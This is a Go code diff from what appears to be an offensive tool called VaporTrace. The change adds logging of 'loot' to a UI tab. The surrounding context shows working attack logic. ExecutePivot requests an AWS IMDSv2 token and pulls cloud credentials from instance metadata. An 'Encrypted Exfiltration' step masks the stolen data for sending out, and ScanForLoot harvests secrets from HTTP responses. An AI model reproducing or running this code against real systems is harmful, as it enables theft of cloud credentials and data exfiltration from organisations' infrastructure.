@@ -9,6 +9,7 @@ import (
 	"time"
 
 	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
+	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
 	"github.com/pterm/pterm"
 )
 
@@ -56,7 +57,10 @@ func ScanForLoot(body string, url string) {
 					Source: url,
 				}
 				Vault = append(Vault, finding)
-				
+
+				// ROUTING: Send to F3 Loot Tab
+				utils.LogLoot(label, m, url)
+
 				pterm.Warning.Prefix = pterm.Prefix{Text: "LOOT", Style: pterm.NewStyle(pterm.BgYellow, pterm.FgBlack)}
 				pterm.Warning.Printfln("New %s found in response from %s", label, url)
 
@@ -75,14 +79,14 @@ func ScanForLoot(body string, url string) {
 // ExecutePivot performs specialized cloud-metadata harvesting
 func ExecutePivot(target string, source string) {
 	pterm.Info.WithPrefix(pterm.Prefix{Text: "PIVOT"}).Printfln("Initiating lateral harvest on %s", target)
-	
+
 	client := &http.Client{Timeout: 5 * time.Second}
 
 	// Step A: Try IMDSv2 Token acquisition
 	token := ""
 	tokenReq, _ := http.NewRequest("PUT", fmt.Sprintf("http://%s/latest/api/token", target), nil)
 	tokenReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
-	
+
 	tokenResp, err := client.Do(tokenReq)
 	if err == nil && tokenResp.StatusCode == 200 {
 		tBytes, _ := io.ReadAll(tokenResp.Body)
@@ -101,9 +105,9 @@ func ExecutePivot(target string, source string) {
 	if err == nil && hResp.StatusCode == 200 {
 		body, _ := io.ReadAll(hResp.Body)
 		hResp.Body.Close()
-		
+
 		lootContent := string(body)
-		
+
 		// 1. Encrypted Exfiltration (Phase 8.3)
 		payload := fmt.Sprintf("PIVOT_HIT | SRC:%s | DATA:%s", source, lootContent)
 		masked := GhostMask([]byte(payload), MasterKey)
@@ -117,5 +121,8 @@ func ExecutePivot(target string, source string) {
 			Source: source,
 		})
 		vaultMux.Unlock()
+
+		// ROUTING: Send to F3 Loot Tab
+		utils.LogLoot("CLOUD_CREDS", lootContent, source)
 	}
 }
